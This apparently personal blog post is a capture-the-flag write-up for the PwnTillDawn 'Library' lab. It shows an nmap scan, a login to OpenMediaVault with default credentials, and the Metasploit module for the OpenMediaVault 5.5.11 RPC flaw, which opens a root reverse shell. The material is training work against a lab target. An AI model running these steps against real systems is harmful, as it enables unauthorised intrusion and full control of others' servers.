---
layout: post
title: PwnTillDawn - Library Write-Up
date: 2024-11-17
classes: wide
description: Exploring an Open Media Vault webserver with Metasploit modules.
---

# Library (10.150.150.111)

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_library/1.png)

## Scanning Target

The first obvious step is to fire up nmap to gather information about ports on our target:

```
$ sudo nmap -sV -sC -oN scans/nmap.txt 10.150.150.111
```

Interetingly enough, we only have one accessible port, in this case it's `80/tcp` and apparently running Open Media Vault on it.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_library/2.png)



## Webserver Exploration

As shown by Nmap, this is an Open Media Vault control panel running on the web server.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_library/3.png)

A quick note: remember to always check for default credentials, beucase it took me a really long time to figure out it was this obvious. After searching out, I've found the default credentials are `admin:openmediavault`, who would've guessed?

Once we've successfully accessed the control panel with the administration account, we are greeted with the dashboard, showing us  a version string which can be useful to search for exploits later on.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_library/4.png)

After a quick search, discovered that Rapid7 has a Metasploit module to exploit OpenMediaVault version **5.5.11** with a Remote Code Execution (RCE) vulnerability through `rcp.php`, awesome! Moveover, it matches our target version string.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_library/5.png)



## Exploiting Target

Let's try and exploit the server with the recently discovered exploit.

```
$ sudo msfconsole
msf6 > use unix/webapp/openmediavault_rpc_rce
msf6 > set lhost X.X.X.X
msf6 > set rhosts 10.150.150.111
```

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_library/6.png)

Looks like it worked, as we got a message informing about a newly created session. Let's check it out by accessing the most recent session in our Metasploit.

```
msf6 > sessions -i -1
meterpreter > shell
/bin/bash -i
```

Not only it worked as expected, but we've now got access directly to the root user, so we won't have to bother with privilege escalation process this time.

Soon after gaining access,  we can find **FLAG1.txt** inside root's home directory.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_library/7.png)

After searching out a while for the second flag, I've came up with the ideia of using grep recursively to find out where it is.

```
$ grep -rni "flag2" / 2>/dev/null
```

What this command does is search out for the string "flag2"  on the root of the system, while ignoring case differences and sending error messages to `/dev/null`.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/pwntilldawn_library/8.png)

